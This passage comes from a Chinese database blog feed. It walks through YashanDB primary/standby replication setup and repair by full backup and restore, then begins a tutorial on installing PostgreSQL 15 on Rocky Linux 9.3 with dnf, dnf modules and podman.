class="line">---------------------------------------------------------------- </span><br><span class="line">yasdb                                                           </span><br><span class="line"></span><br><span class="line">1 row fetched.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">SQL&gt; </span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>output, yas2:</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@yashan2 /]# su - yashan</span><br><span class="line">Last login: Thu Nov 23 10:04:38 UTC 2023</span><br><span class="line">[yashan@yashan2 ~]$ ~/yashandb/yasdb_home/scripts/initDB.sh</span><br><span class="line">process started!</span><br><span class="line">Database open succeed !</span><br><span class="line">[yashan@yashan2 ~]$ yasql sys/yasdb_123</span><br><span class="line">YashanDB SQL Personal Edition Release 23.1.1.100 x86_64</span><br><span class="line"></span><br><span class="line">Connected to:</span><br><span class="line">YashanDB Server Personal Edition Release 23.1.1.100 x86_64 - X86 64bit Linux</span><br><span class="line"></span><br><span class="line">SELECT STATUS FROM V$INSTANCE;</span><br><span class="line"></span><br><span class="line">STATUS        </span><br><span class="line">------------- </span><br><span class="line">OPEN         </span><br><span class="line"></span><br><span class="line">1 row fetched.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">SQL&gt; </span><span class="language-bash">SELECT database_name FROM v<span class="variable">$database</span>;</span></span><br><span class="line"></span><br><span class="line">DATABASE_NAME                                                    </span><br><span class="line">---------------------------------------------------------------- </span><br><span class="line">yasdb                                                           </span><br><span class="line"></span><br><span class="line">1 row fetched.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">SQL&gt; </span></span><br></pre></td></tr></table></figure></div>
<p>到此，我们已经准备了两个数据库，接下来进行主备配置。</p>
<h2 id="主备配置">主备配置</h2>
<blockquote>
<p>YashanDB支持主备模式（一主多备）和级联备模式（不限层级）的高可用部署架构。<br>
主备复制中，通过主机发送redo日志，备机接收日志并回放，以实现备机和主机的在线同步。YashanDB采用环形Log Cache缓存redo日志，同步模式下日志发送和备机回放优先从缓存读取数据，提高速度。</p>
</blockquote>
<img  alt="imgprimarystandby.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231124-fd247947-9597-41ad-8375-e42db1fe2ad8.png"
                      referrerpolicy="no-referrer"
                >
<p>依据官网说明，我们先进行主备参数配置，下面的步骤分别在 yas1 和 yas2 上进行。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- LISTEN_ADDR：本机数据库的IP与监听端口，该参数在安装时已配置。</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span> <span class="keyword">SET</span> LISTEN_ADDR<span class="operator">=</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1688</span> <span class="keyword">scope</span><span class="operator">=</span>spfile;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- REPLICATION_ADDR：本机数据库的IP与同步复制端口，可不配置，则与LISTEN_ADDR共享一个端口。</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span> <span class="keyword">SET</span> REPLICATION_ADDR<span class="operator">=</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1689</span> <span class="keyword">scope</span><span class="operator">=</span>spfile;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 开启归档</span></span><br><span class="line"><span class="keyword">ALTER</span> DATABASE ARCHIVELOG;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 重啓到 mount 模式</span></span><br><span class="line">shutdown;</span><br><span class="line">nohup yasdb mount <span class="operator">&amp;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ARCHIVE_DEST_1：对端数据库的IP与同步复制端口，必须配置。</span></span><br><span class="line"><span class="comment">-- yas2</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span> <span class="keyword">SET</span> ARCHIVE_DEST_1<span class="operator">=</span><span class="string">&#x27;SERVICE=10.188.0.11:1689&#x27;</span> <span class="keyword">scope</span><span class="operator">=</span><span class="keyword">both</span>;</span><br><span class="line"><span class="comment">-- yas1</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span> <span class="keyword">SET</span> ARCHIVE_DEST_1<span class="operator">=</span><span class="string">&#x27;SERVICE=10.188.0.12:1689&#x27;</span> <span class="keyword">scope</span><span class="operator">=</span><span class="keyword">both</span>;</span><br></pre></td></tr></table></figure></div>
<!--
-- 檢查參數設定
show parameter LISTEN_ADDR;
show parameter REPLICATION_ADDR;
show parameter ARCHIVE_DEST_1;
-->
<p>下面的步骤在备机上操作，将备机切换到 Standby 状态。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 備機</span></span><br><span class="line"><span class="keyword">ALTER</span> DATABASE <span class="keyword">CONVERT</span> <span class="keyword">TO</span> PHYSICAL STANDBY;</span><br><span class="line"><span class="keyword">SELECT</span> DATABASE_NAME,LOG_MODE,OPEN_MODE,DATABASE_ROLE,CURRENT_SCN,STATUS,RESTORE_TIME,HOST_NAME <span class="keyword">FROM</span> V$DATABASE;</span><br><span class="line"><span class="keyword">ALTER</span> DATABASE <span class="keyword">OPEN</span>;</span><br><span class="line"><span class="keyword">SELECT</span> CONNECTION,STATUS,PEER_ADDR,TRANSPORT_LAG,APPLY_LAG <span class="keyword">FROM</span> V$REPLICATION_STATUS;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>output, yas2</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONNECTION,STATUS,PEER_ADDR,TRANSPORT_LAG,APPLY_LAG <span class="keyword">FROM</span> V$REPLICATION_STATUS;</span><br><span class="line"></span><br><span class="line">CONNECTION        STATUS            PEER_ADDR                                                        TRANSPORT_LAG    APPLY_LAG </span><br><span class="line"><span class="comment">----------------- ----------------- ---------------------------------------------------------------- ------------- ------------ </span></span><br><span class="line">CONNECTED         NEED REPAIR       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1689</span>                                                            <span class="number">568363</span>       <span class="number">568363</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> fetched.</span><br></pre></td></tr></table></figure></div>
<p>主备相关参数已设定完成，这里看到备机的连接状态为 <code>CONNECTED</code>，说明已连接成功，但是状态为 <code>NEED REPAIR</code>，需要修復複製。</p>
<p>关于修复 <code>NEED REPAIR</code> 的更多内容，可阅读官方文档：<a class="link"   href="https://doc.yashandb.com/yashandb/23.1/zh/%E9%AB%98%E5%8F%AF%E7%94%A8/%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BF%90%E7%BB%B4/%E5%A4%87%E6%9C%BA%E5%BC%82%E5%B8%B8%E4%BF%AE%E5%A4%8D.html#%E5%A4%87%E6%9C%BAneed-repair" >备机NEED REPAIR <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>接下来演示如何通过全量数据恢复来修复同步。</p>
<h2 id="全量备份恢复">全量备份恢复</h2>
<ol>
<li>在 yas1 主节点，创建全量备份。</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 执行全量备份，生成全量备份集 bak_xxx</span></span><br><span class="line">BACKUP DATABASE;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>output, yas1</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> BACKUP DATABASE;</span><br><span class="line"></span><br><span class="line">Succeed.</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[yashan@yashan1 backup]$ pwd</span><br><span class="line">/home/yashan/yashandb/yasdb_data/backup</span><br><span class="line">[yashan@yashan1 backup]$ ls</span><br><span class="line">bak_2023112315425603</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>在 yas2 备节点，恢复全量备份。</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 停机，启动为 nomount 状态</span></span><br><span class="line">shutdown;</span><br><span class="line">nohup yasdb nomount <span class="operator">&amp;</span></span><br><span class="line"><span class="comment">-- 删除现存库，执行 RESTORE 命令恢复备份</span></span><br><span class="line">yasql sys<span class="operator">/</span>yasdb_123</span><br><span class="line"><span class="keyword">drop</span> database;</span><br><span class="line">RESTORE DATABASE <span class="keyword">FROM</span> <span class="string">&#x27;/tmp/bak_2023112315425603&#x27;</span>;</span><br><span class="line"><span class="comment">-- 启动为 STANDBY 状态，并执行 RECOVER 命令</span></span><br><span class="line"><span class="keyword">ALTER</span> DATABASE <span class="keyword">CONVERT</span> <span class="keyword">TO</span> PHYSICAL STANDBY;</span><br><span class="line">RECOVER DATABASE;</span><br><span class="line"><span class="comment">-- 打开数据库</span></span><br><span class="line"><span class="keyword">ALTER</span> DATABASE <span class="keyword">OPEN</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>output, yas2:</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="operator">!</span> hostname</span><br><span class="line">yashan2</span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONNECTION,STATUS,PEER_ADDR,TRANSPORT_LAG,APPLY_LAG <span class="keyword">FROM</span> V$REPLICATION_STATUS;</span><br><span class="line"></span><br><span class="line">CONNECTION        STATUS            PEER_ADDR                                                        TRANSPORT_LAG    APPLY_LAG </span><br><span class="line"><span class="comment">----------------- ----------------- ---------------------------------------------------------------- ------------- ------------ </span></span><br><span class="line">CONNECTED         NORMAL            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1689</span>                                                                 <span class="number">0</span>            <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> fetched.</span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> DATABASE_NAME,LOG_MODE,OPEN_MODE,DATABASE_ROLE,CURRENT_SCN,STATUS,RESTORE_TIME,HOST_NAME <span class="keyword">FROM</span> V$DATABASE;</span><br><span class="line"></span><br><span class="line">DATABASE_NAME                                                    LOG_MODE          OPEN_MODE         DATABASE_ROLE               CURRENT_SCN STATUS                            RESTORE_TIME                     HOST_NAME                                                        </span><br><span class="line"><span class="comment">---------------------------------------------------------------- ----------------- ----------------- ----------------- --------------------- --------------------------------- -------------------------------- ---------------------------------------------------------------- </span></span><br><span class="line">yasdb                                                            ARCHIVELOG        READ_ONLY         STANDBY              <span class="number">503469581563842560</span> NORMAL                                                             yashan2                                                         </span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> fetched.</span><br></pre></td></tr></table></figure></div>
<p>到此，yas2 备节点已恢复完成，并与 yas1 主节点正常建立连接。</p>
<h2 id="验证测试">验证测试</h2>
<p>驗證：在 yas1 主庫裏創建表 <code>t1</code>，在 yas2 從庫裏查看表是否創建成功。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> sbtest;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sbtest.t1 (id <span class="type">int</span>);</span><br></pre></td></tr></table></figure></div>
<img  alt="imgcreatetbl.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231124-1b3c838d-eca7-4a6b-9928-def6003c6901.png"
                      referrerpolicy="no-referrer"
                >
<p>以及，插入數據到表 <code>t1</code>，在從庫中確認數據已經同步。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sbtest.t1 <span class="keyword">values</span> (<span class="number">1</span>);</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure></div>
<img  alt="imginsert.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231124-2d43053b-90bf-413b-8c83-7f77392ab8cb.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>本文演示了如何在本地环境构建 YashanDB 个人版镜像，基于此可以快速、反复做各种实现，是学习、测试利器。</p>
<p>以及，在此基础之上，演示搭建 YashanDB 的主备高可用架构。</p>
<p>由于个人版的限制，分布式和共享集群没有办法尝试搭建了，接下来会分享其他方面的内容。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>YashanDB</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>yashandb</tag>
        <tag>podman</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG15】在 Rocky 9 上安装 PostgreSQL 15 的五种方法（总有一个你没用过🤪）</title>
    <url>/2023/postgresql/pg-15-install-on-rocky-9/</url>
    <content><![CDATA[<p>本文将基于 Rocky Linux 9.3 演示如何安装 PostgreSQL 15。</p>
<p>共介绍五种安装方法：</p>
<ol>
<li>通过 <code>dnf install</code> 安装 PostgreSQL 数据库</li>
<li>通过 <code>dnf module install</code> 安装 PostgreSQL 数据库</li>
<li>通过 <code>podman</code> 拉取 PostgreSQL 镜像，并启动 PostgreSQL 数据库</li>
<li>编译 PostgreSQL 源码，并安装、启动数据库</li>
<li>使用 <code>postgresql</code> 系统角色配置安装 PostgreSQL 数据库</li>
</ol>
<h2 id="环境信息">环境信息</h2>
<p>本文使用的操作系统为 Rocky Linux 9.3</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.3 (Blue Onyx)</span><br></pre></td></tr></table></figure></div>
<p>关于该系统的更多信息，请参阅：</p>
<ul>
<li><a href="https://shawnyan.cn/2023/linux/rocky-9.3-upgrade-from-9.2/">【Rocky9】Rocky Linux 9.2 升级 9.3，及新特性实践</a></li>
</ul>
<!--
- [【Rocky9】Rocky Linux 9.2 升级 9.3，及新特性实践](https://www.modb.pro/db/1726849694440185856)
-->
<h2 id="一、通过-dnf-install-安装-PostgreSQL-数据库">一、通过 <code>dnf install</code> 安装 PostgreSQL 数据库</h2>
<p>依照惯例，对于新系统先装一遍数据库，保持原有的习惯，使用 <code>dnf install</code> 或者 <code>yum install</code> 进行安装。</p>
<p>在 Rocky 9 中，默认情况下，会在 appstream 仓库里寻找安装包，我们看到这里选择了 PostgreSQL Server 13。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf install postgresql-server</span><br><span class="line">Last metadata expiration check: 1:38:01 ago on Wed 22 Nov 2023 07:33:15 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                               Architecture         Version                        Repository               Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> postgresql-server                     x86_64               13.11-1.el9_2                  appstream               5.7 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> postgresql                            x86_64               13.11-1.el9_2                  appstream               1.5 M</span><br><span class="line"> postgresql-private-libs               x86_64               13.11-1.el9_2                  appstream               134 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  3 Packages</span><br><span class="line"></span><br><span class="line">Total size: 7.3 M</span><br><span class="line">Installed size: 29 M</span><br></pre></td></tr></table></figure></div>
<p>我们可以自定义 yum 源，这里通过添加 PGDG 的 yum 源，来获取最新的安装包。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">pgdg15</span>]</span><br><span class="line"><span class="string">name=PostgreSQL</span> <span class="number">15</span> <span class="string">for</span> <span class="string">RHEL</span> <span class="string">/</span> <span class="string">Rocky</span> <span class="string">$releasever</span> <span class="bullet">-</span> <span class="string">$basearch</span></span><br><span class="line"><span class="string">baseurl=https://download.postgresql.org/pub/repos/yum/15/redhat/rhel-$releasever-$basearch</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br></pre></td></tr></table></figure></div>
<p>示例，安装 PG 15.5：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 yum.repos.d]$ sudo dnf install postgresql15-server</span><br><span class="line">Last metadata expiration check: 0:00:32 ago on Wed 22 Nov 2023 09:15:27 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                            Architecture          Version                            Repository             Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> postgresql15-server                x86_64                15.5-1PGDG.rhel9                   pgdg15                6.1 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> lz4                                x86_64                1.9.3-5.el9                        baseos                 58 k</span><br><span class="line"> postgresql15                       x86_64                15.5-1PGDG.rhel9                   pgdg15                1.5 M</span><br><span class="line"> postgresql15-libs                  x86_64                15.5-1PGDG.rhel9                   pgdg15                297 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  4 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 7.9 M</span><br><span class="line">Installed size: 35 M</span><br></pre></td></tr></table></figure></div>
<p>这里补充一点， 2023-11-09, PGDG 发布了 PG15 系列的最新版本 PostgreSQL 15.5，修复了 3 个安全漏洞和 55 个 bug，详情可参考 <a class="link"   href="https://www.postgresql.org/docs/release/15.5/" >Release Notes <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="二、通过-dnf-module-install-安装-PostgreSQL-数据库">二、通过 <code>dnf module install</code> 安装 PostgreSQL 数据库</h2>
<p>从 yum 升级到 dnf 后，引入了新的模块化概念，我们可以通过配置 module 来覆盖 appstream 以获取软件包更新。</p>
<p>直接通过 <code>dnf module install</code> 安装 PG 15：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf module install postgresql:15/server</span><br><span class="line">Last metadata expiration check: 2:01:54 ago on Wed 22 Nov 2023 07:33:15 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                          Architecture    Version                                       Repository          Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing group/module packages:</span><br><span class="line"> postgresql-server                x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          6.1 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> postgresql                       x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          1.6 M</span><br><span class="line"> postgresql-private-libs          x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          137 k</span><br><span class="line">Installing module profiles:</span><br><span class="line"> postgresql/server</span><br><span class="line">Enabling module streams:</span><br><span class="line"> postgresql                                       15</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  3 Packages</span><br><span class="line"></span><br><span class="line">Total size: 7.8 M</span><br><span class="line">Installed size: 32 M</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  postgresql-15.3-1.module+el9.2.0+14925+a515b28a.x86_64</span><br><span class="line">  postgresql-private-libs-15.3-1.module+el9.2.0+14925+a515b28a.x86_64</span><br><span class="line">  postgresql-server-15.3-1.module+el9.2.0+14925+a515b28a.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<p>或者，启用 postgresql 模块，然后直接用 <code>dnf install</code> 进行安装。</p>
<ul>
<li>查看 module</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ dnf module list</span><br><span class="line">Rocky Linux 9 - AppStream                                                                2.7 MB/s | 7.4 MB     00:02</span><br><span class="line">Rocky Linux 9 - BaseOS                                                                   2.1 MB/s | 2.2 MB     00:01</span><br><span class="line">Rocky Linux 9 - Extras                                                                    22 kB/s |  13 kB     00:00</span><br><span class="line">Rocky Linux 9 - AppStream</span><br><span class="line">Name          Stream    Profiles                                 Summary</span><br><span class="line">maven         3.8       common [d]                               Java project management and project comprehension tool</span><br><span class="line">nginx         1.22      common [d]                               nginx webserver</span><br><span class="line">nodejs        18        common [d], development, minimal, s2i    Javascript runtime</span><br><span class="line">nodejs        20        common [d], development, minimal, s2i    Javascript runtime</span><br><span class="line">php           8.1       common [d], devel, minimal               PHP scripting language</span><br><span class="line">postgresql    15 [x]    client, server [d]                       PostgreSQL server and client module</span><br><span class="line">redis         7         common [d]                               Redis persistent key-value database</span><br><span class="line">ruby          3.1       common [d]                               An interpreter of object-oriented scripting language</span><br><span class="line"></span><br><span class="line">Hint: [d]efault, [e]nabled, [x]disabled, [i]nstalled</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<ul>
<li>启用 module</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf module enable postgresql</span><br><span class="line">Last metadata expiration check: 1:59:13 ago on Wed 22 Nov 2023 07:33:15 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                     Architecture               Version                        Repository                   Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Enabling module streams:</span><br><span class="line"> postgresql                                             15</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line"></span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Complete!</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<ul>
<li>调用 module 安装 PG 15</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf install postgresql-server</span><br><span class="line">Last metadata expiration check: 2:06:30 ago on Wed 22 Nov 2023 07:33:15 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                          Architecture    Version                                       Repository          Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> postgresql-server                x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          6.1 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> postgresql                       x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          1.6 M</span><br><span class="line"> postgresql-private-libs          x86_64          15.3-1.module+el9.2.0+14925+a515b28a          appstream          137 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  3 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 7.8 M</span><br><span class="line">Installed size: 32 M</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>到此，我们讲解了两种使用 dnf 进行安装 PG 数据库的办法，在实际使用过程中，我们可能还会在内网搭建一套自行维护的仓库，这需要更多的步骤，但主要操作流程和上面大同小异。</p>
<h2 id="三、通过-podman-拉取-PostgreSQL-镜像，并启动-PostgreSQL-数据库">三、通过 <code>podman</code> 拉取 PostgreSQL 镜像，并启动 PostgreSQL 数据库</h2>
<p>从 RHEL 9 开始，引入了 Podman，并将其作为默认值。 Podman 更加小巧、安全，而且不需要守护进程。</p>
<p>为了保留习惯，向下兼容，我们除了安装 <code>podman</code> 之外，还将安装 <code>podman-docker</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf install podman podman-docker</span><br><span class="line">Last metadata expiration check: 2:12:02 ago on Wed 22 Nov 2023 07:33:15 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                            Architecture           Version                       Repository                 Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> podman                             x86_64                 2:4.6.1-5.el9                 appstream                  15 M</span><br><span class="line"> podman-docker                      noarch                 2:4.6.1-5.el9                 appstream                  66 k</span><br><span class="line">Installing dependencies:</span><br><span class="line"> conmon                             x86_64                 2:2.1.8-1.el9                 appstream                  51 k</span><br><span class="line"> shadow-utils-subid                 x86_64                 2:4.9-8.el9                   baseos                     86 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  4 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 15 M</span><br><span class="line">Installed size: 51 M</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  conmon-2:2.1.8-1.el9.x86_64                 podman-2:4.6.1-5.el9.x86_64       podman-docker-2:4.6.1-5.el9.noarch</span><br><span class="line">  shadow-utils-subid-2:4.9-8.el9.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<p>拉取镜像步骤和之前 docker 相似，只是需要注意 podman 已经替代了 docker。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ podman pull postgres:15</span><br><span class="line">✔ docker.io/library/postgres:15</span><br><span class="line">Trying to pull docker.io/library/postgres:15...</span><br><span class="line">Getting image source signatures</span><br><span class="line">Copying blob 0887062b031b done</span><br><span class="line">Copying blob 7424befe58d6 done</span><br><span class="line">Copying blob 136c0aa94f90 done</span><br><span class="line">Copying blob 99d820fe3716 done</span><br><span class="line">Copying blob 834a7fce6be7 done</span><br><span class="line">Copying blob 1f7ce2fa46ab done</span><br><span class="line">Copying blob 343a6a92954a done</span><br><span class="line">Copying blob 54fbafc0c84c done</span><br><span class="line">Copying blob 0780e4ae473b done</span><br><span class="line">Copying blob 0e0518459d99 done</span><br><span class="line">Copying blob eddd58e4f8a1 done</span><br><span class="line">Copying blob 97c5119aca7d done</span><br><span class="line">Copying blob a97ae632ca42 done</span><br><span class="line">Copying config 8cde386e2e done</span><br><span class="line">Writing manifest to image destination</span><br><span class="line">8cde386e2e85cce0eb684d0b27ddf6a8abbecd05d5af43bbbdf7be12c47c44e8</span><br><span class="line">[shawnyan@rocky9 ~]$ podman images</span><br><span class="line">REPOSITORY                  TAG         IMAGE ID      CREATED      SIZE</span><br><span class="line">docker.io/library/postgres  15          8cde386e2e85  12 days ago  427 MB</span><br></pre></td></tr></table></figure></div>
<p>拉起 PG 容器。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ podman run --name pg15 -e POSTGRES_PASSWORD=12356 -d postgres:15</span><br><span class="line">fe960ddeb6512856ff9983c1ffa26b74006b2dc59ccef59fb9a068baf1d31bd6</span><br><span class="line">[shawnyan@rocky9 ~]$ podman ps</span><br><span class="line">CONTAINER ID  IMAGE                          COMMAND     CREATED        STATUS        PORTS       NAMES</span><br><span class="line">fe960ddeb651  docker.io/library/postgres:15  postgres    3 seconds ago  Up 3 seconds              pg15</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<p>连接 PostgreSQL 服务器，并查看版本。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ podman exec -it pg15 psql -U postgres</span><br><span class="line">psql (15.5 (Debian 15.5-1.pgdg120+1))</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# select version();</span><br><span class="line">                                                       version</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 15.5 (Debian 15.5-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<h2 id="四、编译-PostgreSQL-源码，并安装、启动数据库">四、编译 PostgreSQL 源码，并安装、启动数据库</h2>
<p>在之前的文章中， <a href="https://shawnyan.cn/2023/postgresql/pg-15-compile-with-dockerfile/">【PG15】 自定义 Dockerfile 构建 PostgreSQL 15 编译版 Docker 镜像</a> ，介绍过如何编译 PG 15，具体过程不再赘述，这里强调一下不同。</p>
<ol>
<li>前文是在 docker 中，基于 CentOS 7 构建，文本是直接在 Rocky Linux 9.3 上编译构建。</li>
<li>前文使用的是 PostgreSQL 15.2 源码，本文使用的是最新的 15.5 源码。</li>
